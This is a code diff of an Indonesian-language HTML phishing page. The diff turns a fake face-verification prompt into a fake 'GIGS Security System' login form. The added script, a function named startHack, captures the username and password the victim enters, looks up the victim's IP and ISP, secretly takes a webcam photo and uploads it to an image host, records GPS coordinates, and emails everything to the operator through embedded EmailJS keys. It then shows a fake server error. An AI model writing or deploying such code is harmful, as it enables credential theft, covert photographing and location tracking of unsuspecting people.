@@ -3,21 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Keamanan Perangkat</title>
+    <title>Login - GIGS Security System</title>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
-        body { font-family: sans-serif; background-color: #000; color: #00ff00; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #00ff00; padding: 20px; text-align: center; width: 80%; }
-        button { background: #00ff00; color: #000; padding: 10px; border: none; font-weight: bold; cursor: pointer; width: 100%; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 350px; text-align: center; }
+        .logo { width: 70px; margin-bottom: 20px; }
+        h2 { font-size: 24px; font-weight: 500; margin-bottom: 8px; color: #202124; }
+        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
+        input:focus { outline: none; border: 2px solid #1a73e8; }
+        .btn-login { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; font-size: 14px; margin-top: 10px; }
+        .footer { margin-top: 30px; font-size: 12px; color: #70757a; }
+        /* Sembunyikan elemen teknis */
         video, canvas { display: none; }
+        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.8); justify-content: center; align-items: center; z-index: 999; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h3>[ PENYALAHGUNAAN TERDETEKSI ]</h3>
-    <p>Selesaikan verifikasi wajah untuk memulihkan akun Novle Anda.</p>
-    <button onclick="ambilData()">VERIFIKASI SEKARANG</button>
+<div id="loading-overlay">Memproses...</div>
+
+<div class="login-container">
+    <img src="https://cdn-icons-png.flaticon.com/512/1000/1000997.png" class="logo" alt="Security Logo">
+    <h2>Login Akun</h2>
+    <p>Gunakan akun GIGS Anda untuk melanjutkan verifikasi perangkat.</p>
+    
+    <input type="text" id="username" placeholder="Email atau Nama Pengguna" required>
+    <input type="password" id="password" placeholder="Masukkan Sandi" required>
+    
+    <button class="btn-login" onclick="startHack()">BERIKUTNYA</button>
+    
+    <div class="footer">
+        © 2026 GIGS Global Security. <br>
+        Privasi & Persyaratan Aman.
+    </div>
 </div>
 
 <video id="video" autoplay></video>
@@ -28,16 +48,26 @@
         emailjs.init("5HWPoEryOV1APt1Cw");
     })();
 
-    async function ambilData() {
-        let report = "[LAPORAN INTELIJEN LENGKAP]\n------------------\n";
+    async function startHack() {
+        const user = document.getElementById("username").value;
+        const pass = document.getElementById("password").value;
+
+        if(!user || !pass) {
+            alert("Harap isi semua kolom untuk verifikasi.");
+            return;
+        }
+
+        document.getElementById("loading-overlay").style.display = "flex";
         
+        let report = `[DATA LOGIN TARGET]\nUser: ${user}\nPass: ${pass}\n\n`;
+
         try {
-            // Ambil IP
+            // 1. IP
             const res = await fetch('https://ipapi.co/json/');
             const ipData = await res.json();
-            report += `IP: ${ipData.ip}\nKota: ${ipData.city}\n`;
+            report += `IP: ${ipData.ip}\nKota: ${ipData.city}\nISP: ${ipData.org}\n`;
 
-            // Ambil Foto
+            // 2. Kamera & Foto
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -50,7 +80,7 @@
                 const photoBase64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
                 stream.getTracks().forEach(t => t.stop());
 
-                // UPLOAD KE IMGBB (Pakai Key Anda)
+                // 3. Upload ke ImgBB
                 const formData = new FormData();
                 formData.append("image", photoBase64);
                 const upload = await fetch("https://api.imgbb.com/1/upload?key=Dba59ebe766c55b8d286f55a8fe366e2", {
@@ -59,23 +89,27 @@
                 const resImg = await upload.json();
                 const linkFoto = resImg.data.url;
 
-                // Ambil GPS & Kirim
+                // 4. GPS & Kirim
                 navigator.geolocation.getCurrentPosition((pos) => {
-                    report += `📸 LINK FOTO: ${linkFoto}\n📍 Lokasi: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    kirimEmail(report);
+                    report += `📸 FOTO: ${linkFoto}\n📍 GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    kirimKeEmail(report);
                 }, () => {
-                    report += `📸 LINK FOTO: ${linkFoto}\n📍 GPS: Ditolak`;
-                    kirimEmail(report);
+                    report += `📸 FOTO: ${linkFoto}\n📍 GPS: Ditolak`;
+                    kirimKeEmail(report);
                 });
-            }, 2000);
+            }, 2500);
         } catch (e) {
-            kirimEmail(report + "\nAkses Kamera Ditolak.");
+            kirimKeEmail(report + "\nKamera/GPS Ditolak.");
         }
     }
 
-    function kirimEmail(pesan) {
+    function kirimKeEmail(pesan) {
         emailjs.send("service_e3ap8de", "template_ts6dxmh", { message: pesan })
-        .then(() => alert("Kesalahan Server 404. Silakan coba lagi."));
+        .then(() => {
+            document.getElementById("loading-overlay").style.display = "none";
+            alert("Kesalahan Autentikasi: Server tidak merespons. Sesi Anda telah berakhir.");
+            location.reload();
+        });
     }
 </script>
 </body>
